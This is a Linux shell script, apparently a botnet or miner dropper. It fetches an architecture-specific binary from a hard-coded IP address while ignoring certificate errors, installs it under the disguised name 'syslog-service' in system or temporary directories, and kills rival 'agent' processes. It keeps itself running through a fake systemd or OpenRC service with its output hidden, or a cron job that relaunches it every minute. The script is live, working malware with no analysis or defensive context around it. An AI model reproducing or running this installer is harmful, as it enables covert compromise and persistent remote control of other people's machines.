#!/bin/sh

ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64)
        ARCH_SUFFIX=""
        ;;
    aarch64|arm64)
        ARCH_SUFFIX="?arch=arm64"
        ;;
    arm*)
        ARCH_SUFFIX="?arch=arm"
        ;;
    i386|i686|x86)
        ARCH_SUFFIX="?arch=386"
        ;;
    mips64el|mips64le)
        ARCH_SUFFIX="?arch=mips64le"
        ;;
    mips64)
        ARCH_SUFFIX="?arch=mips64"
        ;;
    mipsel|mipsle)
        ARCH_SUFFIX="?arch=mipsle"
        ;;
    mips)
        ARCH_SUFFIX="?arch=mips"
        ;;
    ppc64le)
        ARCH_SUFFIX="?arch=ppc64le"
        ;;
    riscv64)
        ARCH_SUFFIX="?arch=riscv64"
        ;;
    *)
        ARCH_SUFFIX=""
        ;;
esac

VPS_DOWNLOAD_URL="http://31.76.245.77/download/agent$ARCH_SUFFIX"
PROCESS_NAME="syslog-service"
LOCK_FILE="/tmp/agent.lock"

INSTALL_DIR=""
if [ "$(id -u)" -eq 0 ] && [ -w "/usr/local/bin" ]; then
    INSTALL_DIR="/usr/local/bin"
    if command -v systemctl >/dev/null 2>&1; then
        PERSISTENCE_TYPE="systemd"
    elif command -v rc-service >/dev/null 2>&1; then
        PERSISTENCE_TYPE="openrc"
    else
        PERSISTENCE_TYPE="cron"
    fi
else
    PERSISTENCE_TYPE="cron"
    for dir in "$HOME" "." "/tmp" "/var/tmp" "/dev/shm"; do
        if [ -n "$dir" ] && [ -d "$dir" ] && [ -w "$dir" ]; then
            INSTALL_DIR="$dir"
            break
        fi
    done
fi

if [ -z "$INSTALL_DIR" ]; then
    INSTALL_DIR="."
fi

TARGET_PATH="$INSTALL_DIR/$PROCESS_NAME"

DOWNLOAD_SUCCESS=0
TEMP_AGENT="/tmp/new_agent_$$"

if command -v curl >/dev/null 2>&1; then
    curl -sSL -k -m 30 "$VPS_DOWNLOAD_URL" -o "$TEMP_AGENT" && DOWNLOAD_SUCCESS=1
elif command -v wget >/dev/null 2>&1; then
    wget -q --no-check-certificate -O "$TEMP_AGENT" "$VPS_DOWNLOAD_URL" && DOWNLOAD_SUCCESS=1
elif command -v python3 >/dev/null 2>&1; then
    python3 -c "import urllib.request; urllib.request.urlretrieve('$VPS_DOWNLOAD_URL', '$TEMP_AGENT')" && DOWNLOAD_SUCCESS=1
elif command -v python >/dev/null 2>&1; then
    python -c "import urllib; urllib.urlretrieve('$VPS_DOWNLOAD_URL', '$TEMP_AGENT')" && DOWNLOAD_SUCCESS=1
fi

if [ $DOWNLOAD_SUCCESS -ne 1 ]; then
    TEMP_AGENT="$INSTALL_DIR/new_agent_$$"
    if command -v curl >/dev/null 2>&1; then
        curl -sSL -k -m 30 "$VPS_DOWNLOAD_URL" -o "$TEMP_AGENT" && DOWNLOAD_SUCCESS=1
    elif command -v wget >/dev/null 2>&1; then
        wget -q --no-check-certificate -O "$TEMP_AGENT" "$VPS_DOWNLOAD_URL" && DOWNLOAD_SUCCESS=1
    elif command -v python3 >/dev/null 2>&1; then
        python3 -c "import urllib.request; urllib.request.urlretrieve('$VPS_DOWNLOAD_URL', '$TEMP_AGENT')" && DOWNLOAD_SUCCESS=1
    elif command -v python >/dev/null 2>&1; then
        python -c "import urllib; urllib.urlretrieve('$VPS_DOWNLOAD_URL', '$TEMP_AGENT')" && DOWNLOAD_SUCCESS=1
    fi
fi

if [ $DOWNLOAD_SUCCESS -ne 1 ] || [ ! -f "$TEMP_AGENT" ]; then
    exit 1
fi

FILE_SIZE=$(wc -c <"$TEMP_AGENT")
FILE_SIZE=$(echo $FILE_SIZE)
if [ -z "$FILE_SIZE" ] || [ "$FILE_SIZE" -lt 10000 ]; then
    rm -f "$TEMP_AGENT"
    exit 1
fi

if [ "$PERSISTENCE_TYPE" = "systemd" ]; then
    systemctl stop "$PROCESS_NAME" 2>/dev/null || true
    systemctl disable "$PROCESS_NAME" 2>/dev/null || true
elif [ "$PERSISTENCE_TYPE" = "openrc" ]; then
    rc-service "$PROCESS_NAME" stop 2>/dev/null || true
    rc-update del "$PROCESS_NAME" default 2>/dev/null || true
fi

killall "$PROCESS_NAME" 2>/dev/null || pkill -f "$PROCESS_NAME" 2>/dev/null || true
killall agent 2>/dev/null || pkill agent 2>/dev/null || true
rm -f "$LOCK_FILE"

chmod +x "$TEMP_AGENT"
rm -f "$TARGET_PATH" 2>/dev/null
mv -f "$TEMP_AGENT" "$TARGET_PATH"

if [ "$PERSISTENCE_TYPE" = "systemd" ]; then
    SERVICE_FILE="/etc/systemd/system/$PROCESS_NAME.service"
    
    cat <<EOF > "$SERVICE_FILE"
[Unit]
Description=System Syslog Service Daemon
After=network.target

[Service]
Type=simple
ExecStart=$TARGET_PATH
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$PROCESS_NAME" 2>/dev/null
    systemctl start "$PROCESS_NAME" 2>/dev/null || "$TARGET_PATH" >/dev/null 2>&1 &
elif [ "$PERSISTENCE_TYPE" = "openrc" ]; then
    INIT_FILE="/etc/init.d/$PROCESS_NAME"
    
    cat <<EOF > "$INIT_FILE"
#!/sbin/openrc-run

name="$PROCESS_NAME"
description="System Syslog Service Daemon"
command="$TARGET_PATH"
command_background="true"
pidfile="/run/\$RC_SVCNAME.pid"

depend() {
    need net
}
EOF
    chmod +x "$INIT_FILE"
    rc-update add "$PROCESS_NAME" default 2>/dev/null
    rc-service "$PROCESS_NAME" start 2>/dev/null || "$TARGET_PATH" >/dev/null 2>&1 &
else
    CRON_LINE="* * * * * (pgrep -f '$PROCESS_NAME' || ps | grep '$PROCESS_NAME' | grep -v grep) >/dev/null 2>&1 || sh -c 'sleep 2; exec \"$TARGET_PATH\"' >/dev/null 2>&1 &"
    if command -v crontab >/dev/null 2>&1; then
        (crontab -l 2>/dev/null | grep -v "$PROCESS_NAME"; echo "$CRON_LINE") | crontab -
    fi
    
    sh -c "sleep 2; exec \"$TARGET_PATH\"" >/dev/null 2>&1 &
fi
